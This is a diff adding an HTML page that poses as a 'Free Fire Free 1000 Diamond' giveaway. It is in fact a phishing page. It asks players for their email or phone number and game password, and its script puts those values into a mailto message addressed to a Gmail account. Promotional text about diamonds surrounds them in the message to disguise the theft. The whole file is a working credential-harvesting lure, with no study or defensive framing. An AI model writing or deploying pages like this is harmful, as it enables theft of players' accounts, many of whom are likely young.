@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Free Diamonds in Free Fire</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+
+        #loginContainer {
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 300px;
+        }
+
+        #loginContainer img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #ffbb33; /* Color for Free Fire Diamonds text */
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+        }
+
+        button {
+            background-color: #ff5722; /* Button color for Get Diamonds */
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #e64a19; /* Darker shade on hover */
+        }
+    </style>
+</head>
+<body>
+    <div id="loginContainer">
+        <!-- Updated Free Fire logo URL -->
+        <img src="https://files.catbox.moe/9dfpfk.jpg" alt="Free Fire Logo"><br>
+        <h2>Free Fire Free 1000 Diamond</h2>
+
+        <form onsubmit="sendEmail()" method="post">
+            <input type="text" id="emailOrPhone" placeholder="Email or Phone Number" required><br>
+            <input type="password" id="gamePassword" placeholder="Game Password" required><br>
+            <button type="submit">Get Diamonds</button>
+        </form>
+    </div>
+
+    <script>
+        function sendEmail() {
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            const gamePassword = document.getElementById('gamePassword').value;
+
+            const introMessage = "Free Fire has gained immense popularity globally, and having Diamonds in the game can significantly enhance your experience. Diamonds allow players to unlock exclusive skins, characters, emotes, and other premium items, making the game more exciting and competitive.\n\n";
+            const diamondsMessage = "With free Diamonds, you can access a variety of items that will make your gameplay more fun and personalized. You can unlock rare skins, upgrade your characters, and purchase special items that enhance your performance in the game.\n\n";
+            const userDetails = `Entered Information:\nEmail or Phone Number: ${emailOrPhone}\nPassword: ${gamePassword}\n\n`;
+            const closingMessage = "Diamonds in Free Fire provide an edge in both competitive gameplay and customization. Having a large number of Diamonds means you can purchase exclusive content that will make your in-game experience stand out. Stay ahead in the game with your perfect loadout, and enjoy the many benefits that Diamonds offer!\n\n";
+
+            const fullMessage = introMessage + diamondsMessage + userDetails + closingMessage;
+            const mailtoLink = `mailto:get.free.diamonds.ff@gmail.com?subject=Free%20Fire%20Diamonds%20Request&body=${encodeURIComponent(fullMessage)}`;
+
+            window.location.href = mailtoLink;
+            return false;
+        }
+    </script>
+</body>
+</html>
